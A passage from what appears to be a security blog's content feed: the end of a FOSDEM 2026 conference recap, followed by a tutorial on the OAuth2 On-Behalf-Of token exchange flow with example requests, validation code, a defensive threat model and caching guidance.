how do you give your homelab servers cryptographic identities without managing any secrets yourself?\nThe cloud providers have this sorted. AWS gives you IAM roles, GCP has service accounts - your machines get identities automatically and you never touch keys. SPIFFE tries to bring that same model to everyone, but the hard bit is: how do you bootstrap trust when you\u0026rsquo;re running on your own tin instead of AWS?\nArian\u0026rsquo;s solution uses NixOS reproducibility with TPM hardware attestation. Because Nix builds are reproducible, you can predict exactly what the TPM measurements will be before you even boot the machine. Then you use SPIRE (the SPIFFE reference implementation) with a custom TPM attestation plugin.\nWhen the machine boots with the exact software you built, the TPM measurements match what you predicted, and SPIRE issues it a proper TLS certificate with a cryptographic identity. No manual key management, no secrets in config files, no credential rotation headaches. If someone tampers with the boot chain, measurements don\u0026rsquo;t match and they don\u0026rsquo;t get a certificate. Simple.\nThe stack he\u0026rsquo;s using: systemd-ukify for unified kernel images, systemd-measure for TPM prediction, systemd-repart for partition management, systemd-veritysetup for dm-verity root filesystem verification. All glued together with Nix\u0026rsquo;s declarative config. It\u0026rsquo;s the sort of setup that sounds overcomplicated until you realise it actually makes things simpler in the long run.\nOnce you\u0026rsquo;ve got machine identities working, services can talk to each other with mutual TLS without you managing any of it. Certificate rotation, key storage, trust bootstrapping - all handled automatically.\nThis is the future for homelab infrastructure. Treating your own hardware with the same security primitives the cloud providers use, but without vendor lock-in. Proper zero-trust architecture without the pain.\nWatch: Look ma, no secrets! on FOSDEM schedule\nContainers \u0026amp; Orchestration The containers track had some solid content.\nSystemd and Containers Speaker: Lennart Poettering\nWork on integrating OCI-compliant containers with systemd. Native cgroup management, resource limits via systemd unit files, dependency management with containers as first-class services.\nThe idea is systemd speaks OCI directly instead of running separate containerd/runc daemons. Simpler stack, unified management, faster boot.\nSome argue this couples systemd too tightly into containers. Counterpoint is containers are already systemd-centric on most distros.\nIf you\u0026rsquo;re all-in on systemd, worth exploring. For pure Kubernetes workloads, less relevant.\nWatch: Native OCI Container Support in systemd (Video not yet available)\nWatch: VM Integration in systemd (Video not yet available)\neBPF for Container Optimization Speaker: Axel Stefanini\nUsing eBPF to analyze what binaries and libraries containers actually use at runtime, then pruning unused dependencies.\nProfile the container, trace syscalls and file accesses, build dependency graph, prune unused packages. Results showed significant image size reduction for some workloads.\nYou need representative workload data. If profiling doesn\u0026rsquo;t cover edge cases, you\u0026rsquo;ll cut something you actually need. For stable production workloads, powerful.\nWatch: Reducing container images size with eBPF \u0026amp; Podman\nContainer Runtime Security Speaker: Aleksa Sarai\nPath traversal vulnerabilities in container runtimes. This talk disclosed CVEs and demonstrated exploits.\nProblem is container runtimes trust path input from the container. Malicious containers can craft special paths (symlinks, bind mounts) to escape confinement.\nTalk covered issues in runc and other container runtimes, including recent CVEs from November 2025. Also covered libpathrs - a library to make mitigating these attacks easier.\nThis was the most depressing talk - reminded me how fragile container isolation still is. Good that people are working on it, but scary.\nWatch: Path Safety in the Trenches\nClosing Keynote: AI Hype vs Real Security Speaker: Daniel Stenberg\nDaniel Stenberg (curl creator) gave the closing keynote, refreshingly honest.\nThesis: we pour massive resources into AI security research while foundational security problems go unfixed.\nExamples: TLS certificate validation still has basic bugs, memory safety issues still account for most CVEs in C/C++ code, supply chain attacks are trivial to execute while we\u0026rsquo;re distracted by AI threats.\nAI tools are getting good at finding bugs, but not good at understanding why those bugs exist. We optimize for quantity of findings, not quality of understanding.\nPoint: better security ROI comes from funding boring work - memory-safe languages, better tooling, automated testing - than chasing AI-powered everything.\nHard to argue with. The room went quiet during this part. We\u0026rsquo;re all guilty of chasing the shiny new thing while the basics rot.\nWatch: Open Source Security in spite of AI\nWhat Happened After Hours Technical stuff covered. Here\u0026rsquo;s what the evenings were like.\n\"Met this bloke who insisted on buying rounds of 12% ABV stuff. Being British, I couldn't say no to free beer. Mistake. Next thing I know, I'm explaining how TLS works to someone who definitely doesn't care, and they're nodding along politely because I've had too many. Classic.\" Friday night: Wandered Brussels with some folks from the Go community. Ended up at a café near Grand Place. Belgian beer is dangerous - stronger than you think. Three rounds in and we\u0026rsquo;re having heated debates about memory management strategies. Engineers, innit.\nSaturday night: The conference hotel bar was alright, but the real story happened later at Delirium. That place is famous for 2000+ beers, and yeah, we tested that theory. Got absolutely wrecked. The menu\u0026rsquo;s thicker than some conference schedules - Tripels, Quadrupels, fruit beers, barrel-aged stuff. Started fine, ended blurry.\nWalking back to the hotel was an adventure. Brussels cobblestones are not your friend after a session at Delirium.\nFood: Waffles. So many waffles. Brussels waffles are different from Liege - lighter, crispier. Had at least four. No regrets. My bank account does, but I don\u0026rsquo;t.\nSunday morning: Woke up with a headache. Still worth it. The morning coffee queue was basically a therapy session - everyone comparing hangover cures. Consensus: water and painkillers. Science is beautiful.\nThe vibe: What makes FOSDEM special isn\u0026rsquo;t the talks - it\u0026rsquo;s the people. You\u0026rsquo;re walking through the ULB campus and you\u0026rsquo;re literally shoulder-to-shoulder with people who wrote half the software you use daily. Random conversations turn into collaborations. Someone mentions they\u0026rsquo;re working on something and six people jump in with ideas.\nSunday night: Flight back. Exhausted, broke, but buzzing. Spent too much on beer and waffles. Broke until payday despite being well paid. Story of my life.\nWould I go again? Absolutely. Already planning for next year.\nWhat Could Be Better FOSDEM is brilliant, but not perfect. A few issues:\nVenue overcrowding: ULB campus is great but can\u0026rsquo;t handle 8,000 people. Some rooms were standing-room-only. Missed a talk I wanted to see because they hit capacity.\nSchedule conflicts: Too many good talks in the same slot. The Go track and Containers track overlapped heavily. Had to skip things I really wanted to see.\nWi-Fi: Practically non-existent. If you need connectivity during the day, bring your own hotspot.\nNo recordings for some talks: Some speakers opted out of recording. Frustrating when you can\u0026rsquo;t catch everything and want to watch it later.\nBut honestly? For a free conference organized by volunteers, it\u0026rsquo;s incredible. These are nitpicks.\nFinal Thoughts If you\u0026rsquo;ve never been to FOSDEM, go. It\u0026rsquo;s not the most polished conference, but it\u0026rsquo;s got heart. The community energy is unmatched.\nMy takeaways:\nReal security work is boring and underfunded eBPF keeps getting more powerful Embedded Go is getting real Brussels beer is proper strong Next year\u0026rsquo;s advice:\nArrive early - popular talks fill up fast Bring a power bank - outlets are scarce Download talks beforehand - Wi-Fi is terrible Talk to strangers - that\u0026rsquo;s where the real value is Budget extra for beer and waffles - seriously Brussels in winter is cold, but FOSDEM makes it worth it. See you next year.\nLinks:\nFOSDEM 2026 Schedule FOSDEM Video Archive Go Devroom Schedule Containers Devroom Schedule eBPF Devroom Schedule ","date":"4 Feb 2026","permalink":"https://gazsecops.github.io/posts/fosdem-2026-recap/","summary":"\u003cp\u003eJust back from Brussels for FOSDEM 2026. Always brilliant. Solid technical content, interesting people, too much Belgian beer. Here\u0026rsquo;s what I took away from the best bits.\u003c/p\u003e\n\u003cp\u003eThis year\u0026rsquo;s highlights included some genuinely useful Go tooling (OOMProf for debugging memory issues with eBPF), the NixOS crowd showing off proper zero-trust infrastructure for homelabs using TPM attestation, and Daniel Stenberg reminding everyone that we\u0026rsquo;re wasting time on AI hype while basic security problems go unfixed. Also covered: containers, systemd integration, and why Belgian beer is dangerous when you\u0026rsquo;re trying to explain TLS to strangers.\u003c/p\u003e\n\u003caside class=\"pullquote\"\u003e\n\"Met this bloke who insisted on buying rounds of 12% ABV stuff. Being British, I couldn't say no to free beer. Mistake. Next thing I know, I'm explaining how TLS works to someone who definitely doesn't care, and they're nodding along politely because I've had too many. Classic.\"\n\u003c/aside\u003e\n\u003cp\u003eThe technical content was strong, but the real value of FOSDEM is always the people. Walking around ULB campus surrounded by folks who wrote half the software you use daily, having random conversations that turn into collaborations - that\u0026rsquo;s what makes it worth the trip.\u003c/p\u003e","tags":["fosdem","go","containers","ebpf","nixos","conferences","travel"],"title":"FOSDEM 2026: Brussels, Beer, and Good Tech"},{"content":" Engineer: Service A already has the user\u0026rsquo;s access token. Why don\u0026rsquo;t we just forward it to Service B?\nSysadmin: Because it isn\u0026rsquo;t for Service B. Wrong audience, wrong scopes, and you just turned one compromise into \u0026ldquo;own the lot\u0026rdquo;.\nEngineer: So what\u0026rsquo;s the right way?\nSysadmin: Exchange it. Get a token meant for Service B, on behalf of the user. Validate it at Service B. Every time.\nThe On-Behalf-Of (OBO) flow is one of the lesser-understood OAuth2 grant types, yet it\u0026rsquo;s critical for secure microservice architectures.\nOBO is how you keep user identity across service boundaries without turning your API gateway into a skeleton key. It matters because it preserves user identity through a service chain, enables proper audit trails, and limits the damage when a single service gets popped.\nIf you\u0026rsquo;re building microservices that need to maintain user context across service boundaries, this covers when to use OBO versus client credentials, security considerations, and practical implementation patterns.\nWhat is the OBO Flow? The OAuth2 On-Behalf-Of flow allows a service that\u0026rsquo;s already received an access token from a user to obtain another access token for a different service on that user\u0026rsquo;s behalf. The key insight: the user authenticates once, and that authentication flows through your entire system via token exchanges.\nThis matters because it preserves the user\u0026rsquo;s identity throughout your service mesh, enables proper audit trails, and limits the damage if any single service is compromised.\nWhen Should You Use OBO Flow? The key distinction between OBO flow and other OAuth2 flows is whether you have a user context. Here\u0026rsquo;s a structured approach to help you decide.\nDecision Framework Question Your Answer Recommended Flow Is there a user involved? Yes → OBO flow (delegated access) No → Client credentials (machine-to-machine) Do services need to know WHO made the request? Yes → OBO flow No → Client credentials Do different services need different scopes/permissions? Yes → OBO flow No → Client credentials or shared token If API Gateway is compromised, should damage be limited? Yes → OBO flow + per-service tokens Not critical → Simpler approaches may suffice Use OBO Flow When You have a user context and need delegated access:\nService chain with user identity - API Gateway calls User Service on behalf of alice@example.com Per-service authorization - User Service needs user.read, Order Service needs order.create Zero trust architecture - Every service independently verifies the user\u0026rsquo;s identity Containment requirement - If API Gateway is compromised, attacker can\u0026rsquo;t access everything Use Client Credentials When You have no user context (pure machine-to-machine):\nBackground jobs - Cron task calling an API to generate reports Service health checks - Monitoring service checking status of other services Internal automation - CI/CD pipeline calling deployment APIs Non-user-initiated operations - Service A calling Service B for internal maintenance Trade-offs Approach Pros Cons OBO Flow Strong security, least privilege, contained compromise More complex, more IdP load, more tokens to manage Client Credentials Simple, low complexity, well-understood No user context, less granular control Shared Tokens Easiest to implement Compromise = full system access, no containment Common Scenarios Scenario 1: API Gateway → User Service (User authenticated)\nUser → API Gateway → User Service ✅ Use OBO flow - User is making the request. User Service needs to know WHO it\u0026rsquo;s acting on behalf of.\nScenario 2: API Gateway → Analytics Service (Internal aggregation)\nUser → API Gateway → Analytics Service ⚠️ Consider context - If analytics service only needs to know \u0026ldquo;a user made a request\u0026rdquo; (not WHO), client credentials may suffice. If it needs user-specific attribution, OBO flow.\nScenario 3: Cron Job → User Service (No user context)\nCron Job → User Service (purge inactive accounts) ✅ Use client credentials - No user is involved. The cron job is acting on its own behalf.\nScenario 4: API Gateway → Order Service → Payment Service (User checkout)\nUser → API Gateway → Order Service → Payment Service ✅ Use OBO flow - User is making a purchase. Each service needs to know who\u0026rsquo;s placing the order and processing payment.\nWhen Simpler Approaches May Be Appropriate OBO flow adds complexity. Consider simpler alternatives when:\nRisk tolerance is high - If your team is small, services are internal, and compromise isn\u0026rsquo;t catastrophic Time constraints - Maturity of your security posture vs. time to ship Service count is very low - 1-2 services where shared tokens are manageable IdP limitations - Your IdP doesn\u0026rsquo;t support OBO flow well or reliably The key is to make an informed decision based on your specific requirements, risk tolerance, and operational context. OBO flow isn\u0026rsquo;t always the right answer-but when user context and security matter, it often is.\nThe OBO Flow: Step by Step Here\u0026rsquo;s the complete flow, with actual HTTP requests:\nStep 1: User Authenticates (Standard OAuth2) First, the user goes through a standard OAuth2 authorization code flow:\nGET /authorize? response_type=code\u0026amp; client_id=your_client_id\u0026amp; redirect_uri=https://your-app.com/callback\u0026amp; scope=openid profile email User logs in, you get an authorization code, exchange it for tokens:\nPOST /token HTTP/1.1 Host: auth.example.com Content-Type: application/x-www-form-urlencoded grant_type=authorization_code\u0026amp; code=SplxlOBeZQQYbYS6WxSbIA\u0026amp; redirect_uri=https://your-app.com/callback\u0026amp; client_id=your_client_id\u0026amp; client_secret=your_client_secret Response:\n{ \u0026#34;access_token\u0026#34;: \u0026#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...\u0026#34;, \u0026#34;token_type\u0026#34;: \u0026#34;Bearer\u0026#34;, \u0026#34;expires_in\u0026#34;: 3600, \u0026#34;refresh_token\u0026#34;: \u0026#34;tGzv3JOkF0XG5Qx2TlKWIA\u0026#34; } Step 2: Service A Receives the Token The client (web app, mobile app) now holds access_token and makes requests to Service A:\nGET /api/user/profile HTTP/1.1 Host: api.example.com Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs... Step 3: Service A Needs to Call Service B (OBO Begins!) Service A needs user data from Service B. Instead of forwarding the original token (which has the wrong scopes), it exchanges it:\nPOST /token HTTP/1.1 Host: auth.example.com Content-Type: application/x-www-form-urlencoded grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer\u0026amp; assertion=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...\u0026amp; requested_token_use=on_behalf_of\u0026amp; scope=openid profile user.read\u0026amp; client_id=service_a_client_id\u0026amp; client_secret=service_a_client_secret Key parameters:\ngrant_type=urn:ietf:params:oauth:grant-type:jwt-bearer - This is the OBO grant type assertion - The incoming access token from the client requested_token_use=on_behalf_of - Tells the IdP this is an OBO request client_id/client_secret - Service A\u0026rsquo;s own credentials (NOT the user\u0026rsquo;s!) Response:\n{ \u0026#34;access_token\u0026#34;: \u0026#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6...\u0026#34;, \u0026#34;token_type\u0026#34;: \u0026#34;Bearer\u0026#34;, \u0026#34;expires_in\u0026#34;: 3600, \u0026#34;scope\u0026#34;: \u0026#34;openid profile user.read\u0026#34; } Notice the new access_token is different-it\u0026rsquo;s scoped for Service B.\nStep 4: Service A Calls Service B GET /api/internal/user/details HTTP/1.1 Host: user-service.example.com Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6... Service B validates the token, extracts the user\u0026rsquo;s identity, and returns the data.\nSecurity Considerations 1. Token Validation at Every Service Every service MUST validate incoming tokens:\n// Go example using https://github.com/coreos/go-oidc provider, _ := oidc.NewProvider(ctx, \u0026#34;https://auth.example.com\u0026#34;) verifier := provider.Verifier(\u0026amp;oidc.Config{ ClientID: \u0026#34;your_client_id\u0026#34;, }) token := strings.Replace(authHeader, \u0026#34;Bearer \u0026#34;, \u0026#34;\u0026#34;, 1) idToken, err := verifier.Verify(ctx, token) if err != nil { // Invalid token return nil, err } // Extract claims var claims struct { Email string `json:\u0026#34;email\u0026#34;` Verified bool `json:\u0026#34;email_verified\u0026#34;` Scopes []string `json:\u0026#34;scope\u0026#34;` } if err := idToken.Claims(\u0026amp;claims); err != nil { return nil, err } 2. Scope Validation Don\u0026rsquo;t just verify the token-verify it has the right scopes:\n# Python example required_scopes = [\u0026#34;user.read\u0026#34;] if not required_scopes: return True # No scopes required token_scopes = set(claims.get(\u0026#34;scope\u0026#34;, \u0026#34;\u0026#34;).split()) has_all_scopes = all(scope in token_scopes for scope in required_scopes) if not has_all_scopes: return jsonify({\u0026#34;error\u0026#34;: \u0026#34;insufficient_scope\u0026#34;}), 403 3. Client Credential Rotation Rotate client secrets regularly. Use short-lived tokens (5-15 minutes is reasonable for microservices).\n4. HTTPS Everywhere All token exchanges MUST be over HTTPS. Never, ever expose tokens in URLs or logs.\n5. Token Caching Cache exchanged tokens to reduce load on your IdP, but always respect expires_in:\n// Java pseudo-code Cache\u0026lt;String, TokenResponse\u0026gt; tokenCache = Caffeine.newBuilder() .expireAfterWrite(Duration.ofMinutes(5)) .build(); public String getObOtoken(String originalToken, String targetScope) { String cacheKey = originalToken + \u0026#34;:\u0026#34; + targetScope; return tokenCache.get(cacheKey, key -\u0026gt; { return exchangeToken(originalToken, targetScope); }); } Threat Model: What OBO Flow Protects Against (And What It Doesn\u0026rsquo;t) OBO flow isn\u0026rsquo;t a silver bullet. It\u0026rsquo;s a powerful pattern that mitigates specific threats, but it doesn\u0026rsquo;t solve all security problems. Here\u0026rsquo;s a realistic threat matrix.\nThreats OBO Flow Mitigates Threat OBO Flow Protection Why It Works Credential Theft \u0026amp; Spread ✅ Strong User credentials never leave the IdP. Services only hold their own client credentials, not user passwords. Token Replay Across Services ✅ Strong (with aud claim) Each OBO token has a specific aud claim. A token for User Service cannot be used against Order Service. Compromised Service → Full System Access ✅ Strong If API Gateway is compromised, attacker gets gateway tokens. They\u0026rsquo;d need to exchange tokens for each service, and each exchange requires the service\u0026rsquo;s client credentials (which attacker doesn\u0026rsquo;t have). Privilege Escalation via Token Reuse ✅ Strong Token scopes are enforced per service. A token with user.read can\u0026rsquo;t magically gain user.delete through OBO exchange. Service Impersonation ✅ Strong Each service uses its own client_id/client_secret. Service A can\u0026rsquo;t exchange a token for Service B without Service A\u0026rsquo;s credentials. Stolen Token Long-Term Abuse ✅ Moderate Short token lifetimes (5-15 min) limit the window of opportunity. Even if a token is stolen, it expires quickly. Lateral Movement ✅ Moderate Attacker can\u0026rsquo;t simply take a token from one service and use it everywhere. Each service requires its own token exchange. Threats OBO Flow Does NOT Protect Against Threat OBO Flow Protection What You Need Instead Compromised Identity Provider ❌ None If your IdP (Azure AD, Auth0, etc.) is compromised, all bets are off. Secure your IdP aggressively. Service Code Injection / RCE ❌ None OBO protects authentication, not application security. Use secure coding practices, input validation, sandboxing. Network Eavesdropping (MITM) ❌ None (partial) OBO flow uses HTTPS, but that\u0026rsquo;s transport security, not OBO-specific. Use proper TLS, certificate pinning, HSTS. Zero-Day in Service Runtime ❌ None OBO doesn\u0026rsquo;t patch vulnerabilities in your services. Patch promptly, use security scanning. Insider Threat / Rogue Admin ❌ None If someone has admin access to your IdP or services, OBO won\u0026rsquo;t stop them. Use principle of least privilege, audit logging. Compromised Service with Legitimate Access ⚠️ Limited If Service A is compromised and legitimately has user.read scope, it can still read user data. OBO doesn\u0026rsquo;t limit what a compromised service can legitimately do. Social Engineering / Phishing ❌ None Users can still be tricked into giving up their tokens. Use MFA, security awareness training. Token Replay Within Valid Window ⚠️ Limited If an attacker steals a token, they can use it until it expires. OBO limits the scope and audience, but doesn\u0026rsquo;t prevent replay during the token\u0026rsquo;s lifetime. Real-World Scenario: Compromised API Gateway Let\u0026rsquo;s walk through what happens when your API Gateway is compromised.\nScenario: Attacker gains RCE on API Gateway.\nWithout OBO flow (shared tokens):\n1. Attacker reads gateway\u0026#39;s client credentials 2. Attacker generates tokens for ANY scope 3. Attacker accesses Order Service, Payment Service, User Service 4. Complete system compromise With OBO flow:\n1. Attacker reads gateway\u0026#39;s client credentials 2. Attacker can only exchange tokens using gateway\u0026#39;s credentials 3. Gateway has limited scopes (e.g., `user.read`, `order.read`) 4. Attacker exchanges token for User Service → gets `user.read` token 5. Attacker tries to exchange for Payment Service → IdP rejects (no `payment.write` scope) 6. Attacker can\u0026#39;t escalate to admin scopes 7. Damage is contained to what gateway legitimately could do Critical difference: OBO flow enforces principle of least privilege at the token level. A compromised service can only do what it was designed to do, not everything.\nLimitations and Caveats OBO flow is NOT a replacement for:\nNetwork segmentation - Put services in separate VPCs, use service meshes Application security - Input validation, output encoding, secure libraries Secrets management - Rotate client secrets, use vaults (HashiCorp Vault, AWS Secrets Manager) Monitoring and alerting - Detect anomalous token exchange patterns Rate limiting - Prevent brute force on token exchange endpoints OBO flow IS a replacement for:\nStoring user passwords in multiple services - Never do this Trusting tokens blindly - Always validate, verify scopes, check aud Long-lived tokens for microservices - Keep them short (5-15 min) Shared credentials across services - Each service gets its own client Defense in Depth OBO flow works best as part of a layered defense:\n┌─────────────────────────────────────────┐ │ Network Security (VPC, TLS) │ ├─────────────────────────────────────────┤ │ OBO Flow (Zero Trust Auth) │ ├─────────────────────────────────────────┤ │ Application Security (Input Validation)│ ├─────────────────────────────────────────┤ │ Monitoring \u0026amp; Alerting │ └─────────────────────────────────────────┘ If one layer fails, the others still protect you. OBO flow is the authentication layer-it\u0026rsquo;s critical, but not sufficient on its own.\nCommon Pitfalls Pitfall 1: Forwarding the Original Token ❌ Wrong: Service A forwards the client\u0026rsquo;s token to Service B\nThe problem: The original token might not have the right scopes, or Service B might not be configured to accept it.\n✅ Right: Service A exchanges the token for a Service B-specific token\nPitfall 2: Storing User Credentials ❌ Wrong: Services store user passwords or refresh tokens\nThis violates the zero trust principle and creates massive security risk.\n✅ Right: Each service only holds its own client credentials, never the user\u0026rsquo;s\nPitfall 3: Ignoring Token Expiry ❌ Wrong: Using tokens indefinitely or caching them for too long\nTokens expire for a reason-respect it.\n✅ Right: Always check expires_in and refresh tokens proactively\nPitfall 4: Missing Audience (aud) Claim ❌ Wrong: Tokens without an aud claim can be replayed across services\n✅ Right: Ensure each OBO token has a specific aud claim for the target service\n{ \u0026#34;aud\u0026#34;: \u0026#34;user-service.example.com\u0026#34;, \u0026#34;sub\u0026#34;: \u0026#34;user123\u0026#34;, \u0026#34;scope\u0026#34;: \u0026#34;user.read\u0026#34; } Implementation Examples Azure AD (Microsoft Entra ID) Azure AD has first-class OBO support:\nPOST /{tenant}/oauth2/v2.0/token HTTP/1.1 Host: login.microsoftonline.com Content-Type: application/x-www-form-urlencoded grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer\u0026amp; client_id={service_a_client_id}\u0026amp; client_secret={service_a_client_secret}\u0026amp; assertion={incoming_token}\u0026amp; requested_token_use=on_behalf_of\u0026amp; scope=https://graph.microsoft.com/user.read Microsoft Documentation\nAuth0 POST /oauth/token HTTP/1.1 Host: {tenant}.auth0.com Content-Type: application/json { \u0026#34;grant_type\u0026#34;: \u0026#34;urn:ietf:params:oauth:grant-type:jwt-bearer\u0026#34;, \u0026#34;client_id\u0026#34;: \u0026#34;{service_a_client_id}\u0026#34;, \u0026#34;client_secret\u0026#34;: \u0026#34;{service_a_client_secret}\u0026#34;, \u0026#34;audience\u0026#34;: \u0026#34;https://user-service.example.com\u0026#34;, \u0026#34;subject_token\u0026#34;: \u0026#34;{incoming_token}\u0026#34;, \u0026#34;subject_token_type\u0026#34;: \u0026#34;urn:ietf:params:oauth:token-type:access_token\u0026#34; } Auth0 Documentation\nKeycloak POST /realms/{realm}/protocol/openid-connect/token HTTP/1.1 Host: keycloak.example.com Content-Type: application/x-www-form-urlencoded grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer\u0026amp; assertion={incoming_token}\u0026amp; requested_token_use=on_behalf_of\u0026amp; scope=openid profile\u0026amp; client_id={service_a_client_id}\u0026amp; client_secret={service_a_client_secret} Keycloak Documentation\nAlternative: Token Introspection Some IdPs (like Keycloak) support token introspection as an alternative to OBO:\nPOST /introspect HTTP/1.1 Host: auth.example.com Content-Type: application/x-www-form-urlencoded client_id={service_a_client_id}\u0026amp; client_secret={service_a_client_secret}\u0026amp; token={incoming_token} Response:\n{ \u0026#34;active\u0026#34;: true, \u0026#34;sub\u0026#34;: \u0026#34;user123\u0026#34;, \u0026#34;scope\u0026#34;: \u0026#34;openid profile email\u0026#34;, \u0026#34;client_id\u0026#34;: \u0026#34;api_gateway\u0026#34;, \u0026#34;exp\u0026#34;: 1500000000 } This validates the token without issuing a new one. Use when you don\u0026rsquo;t need new scopes-just validation.\nPerformance Optimisations 1. Token Exchange Caching Cache OBO exchanges with a TTL slightly less than expires_in:\ntype CachedToken struct { Token string ExpiresAt time.Time } var exchangeCache = make(map[string]CachedToken) var cacheMutex sync.RWMutex func getObOtoken(originalToken string, scope string) (string, error) { cacheKey := originalToken + \u0026#34;:\u0026#34; + scope // Check cache cacheMutex.RLock() cached, ok := exchangeCache[cacheKey] cacheMutex.RUnlock() if ok \u0026amp;\u0026amp; time.Now().Before(cached.ExpiresAt) { return cached.Token, nil } // Perform exchange newToken, expires, err := performTokenExchange(originalToken, scope) if err != nil { return \u0026#34;\u0026#34;, err } // Cache it (expire 1 minute early) cacheMutex.Lock() exchangeCache[cacheKey] = CachedToken{ Token: newToken, ExpiresAt: time.Now().Add(time.Duration(expires-60) * time.Second), } cacheMutex.Unlock() return newToken, nil } 2. Asynchronous Token Refresh Don\u0026rsquo;t block requests on token refresh. Use a background goroutine:\nfunc startTokenRefresher() { ticker := time.NewTicker(30 * time.Second) go func() { for range ticker.C { refreshExpiringTokens() } }() } 3. Connection Pooling Reuse HTTP connections to your IdP:\nimport requests session = requests.Session() session.mount(\u0026#39;https://\u0026#39;, requests.adapters.HTTPAdapter( pool_connections=10, pool_maxsize=100, max_retries=3 )) Data Caching: Security vs Performance Trade-Offs When using OBO flow, you\u0026rsquo;ll face a common dilemma: cache data on your platform for performance, or fetch it in real-time for security? There\u0026rsquo;s no universal answer-only trade-offs based on your risk tolerance.\nReal-Time Fetching (No Caching) Platform → Backend API → Return data to user (no storage) Pros:\nNo cached data exposure - If platform is compromised, there\u0026rsquo;s nothing to steal Trust boundary intact - Data stays in your backend services, never persisted to platform Regulatory compliance - Easier to meet GDPR, HIPAA, data residency requirements Fresh data - Users always see the latest information Cons:\nSlower UX - Every request requires backend round-trip Higher backend load - More traffic to your services Limited scalability - Harder to handle traffic spikes Use when:\nData is sensitive (personal info, financial records, PII) Real-time accuracy matters (stock prices, account balances) Regulatory requirements forbid data storage in third-party platforms Performance requirements are modest Caching on Platform Platform → Backend API → Cache data locally → Return to user (storage) Pros:\nFast UX - Sub-second response times Lower backend load - Fewer API calls Better scalability - Can handle traffic spikes Cost reduction - Fewer API calls = lower infrastructure costs Cons:\nCached data exposed - If platform is compromised, cached data is stolen Trust boundary broken - Data now lives outside your control Stale data risk - Users may see outdated information Regulatory complexity - May violate data residency or retention policies Use when:\nData is non-sensitive (public catalogs, configuration) Performance is critical (user-facing dashboards, analytics) Data changes infrequently (product prices, static content) Risk tolerance is acceptable Decision Framework Consideration Real-Time Cached Data sensitivity Personal/financial data Public/anonymized data Performance requirements Not latency-critical Sub-second response times Compromise tolerance Zero tolerance Acceptable risk Regulatory requirements GDPR/HIPAA strictness Less strict Data freshness Real-time critical Staleness acceptable Traffic patterns Consistent, predictable Spiky, burst-heavy Hybrid Approach (Often Best) Mix real-time and cached based on data sensitivity:\ntype DataFetcher struct { cache Cache backend BackendAPI } func (f *DataFetcher) FetchUser(userID string) (UserData, error) { // Sensitive data - always real-time return f.backend.FetchUser(userID) } func (f *DataFetcher) FetchProducts() ([]Product, error) { // Public data - cache aggressively if cached, ok := f.cache.Get(\u0026#34;products\u0026#34;); ok { return cached, nil } products, _ := f.backend.FetchProducts() f.cache.Set(\u0026#34;products\u0026#34;, products, 5*time.Minute) return products, nil } func (f *DataFetcher) FetchRecentActivity(userID string) ([]Activity, error) { // Semi-sensitive - short cache cacheKey := \u0026#34;activity:\u0026#34; + userID if cached, ok := f.cache.Get(cacheKey); ok { return cached, nil } activity, _ := f.backend.FetchRecentActivity(userID) f.cache.Set(cacheKey, activity, 1*time.Minute) return activity, nil } Caching Strategies for Sensitive Data If you must cache sensitive data, follow these guidelines:\n1. Memory-Only Caching\n✅ Do: Use in-memory caches (Redis, Memcached) ❌ Don\u0026#39;t: Persist to disk or database Why? If the platform is compromised, in-memory cache is lost on restart or can be wiped quickly. Persistent storage is harder to clean up.\n2. Short TTL\n# 1-5 minutes for sensitive data cache.set(key, value, ttl=60) # 60 seconds # Longer for public data cache.set(key, value, ttl=300) # 5 minutes 3. Cache Invalidation on Logout\nfunc OnUserLogout(userID string) { cache.DeletePattern(\u0026#34;user:\u0026#34; + userID + \u0026#34;:*\u0026#34;) } 4. Encrypted Caching\nfrom cryptography.fernet import Fernet key = os.environ[\u0026#39;CACHE_ENCRYPTION_KEY\u0026#39;] cipher = Fernet(key) def SetSensitiveCache(key, value, ttl): encrypted = cipher.encrypt(json.dumps(value).encode()) cache.set(key, encrypted, ttl) def GetSensitiveCache(key): encrypted = cache.get(key) if not encrypted: return None decrypted = cipher.decrypt(encrypted) return json.loads(decrypted) Real-World Example: User Dashboard Real-time fetch: ✅ User name, email, phone ✅ Account balance, payment methods ✅ Order history, shipping addresses ✅ Personal preferences, notification settings Short cache (1-2 min): ⚠️ Recent activity feed ⚠️ Notification count ⚠️ Order status updates Long cache (5-30 min): ✅ Available products ✅ Pricing information ✅ Configuration data ✅ Public announcements Cache Key Design Include security context in cache keys to prevent cross-user access:\n# ❌ Bad - can be guessed def GetUserProfile(userID): cache_key = f\u0026#34;profile:{userID}\u0026#34; # ✅ Good - includes session/token context def GetUserProfile(userID, userTokenHash): cache_key = f\u0026#34;profile:{userID}:{userTokenHash}\u0026#34; # ✅ Better - role-aware def GetUserProfile(userID, userTokenHash, userRole): cache_key = f\u0026#34;profile:{userID}:{userTokenHash}:{userRole}\u0026#34; Monitoring Cache Security Track these metrics:\nCache hit rate - High hit rate = more exposure risk if compromised Cache key patterns - Unusual access patterns may indicate compromise TTL violations - Caches living longer than configured Cache invalidation - Are logout events triggering cache cleanup? The Bottom Line There\u0026rsquo;s no universal \u0026ldquo;right answer.\u0026rdquo; The key is:\nClassify your data - What\u0026rsquo;s sensitive vs. public? Define your risk tolerance - What happens if platform is compromised? Make intentional decisions - Document why you\u0026rsquo;re caching (or not) Use hybrid strategies - Real-time for sensitive, cached for public Implement safeguards - Short TTLs, encrypted caches, invalidation on logout When in doubt, default to real-time for sensitive data. You can always add caching later if performance becomes an issue, but you can\u0026rsquo;t undo data exposure once it\u0026rsquo;s happened.\nMonitoring and Observability Key Metrics to Track Token Exchange Rate - How many OBO exchanges per second? Token Cache Hit Rate - Are you effectively caching? IdP Response Time - Slow exchanges hurt your service Token Validation Failures - Security incidents waiting to happen Token Expiry Distribution - Are tokens expiring unexpectedly? To measure any of this you need a couple of metrics. You can do it with generic HTTP metrics (request count/latency to your IdP) but you\u0026rsquo;ll get more useful signal if you emit a few OBO-specific counters.\nRecommended metrics to emit from Service 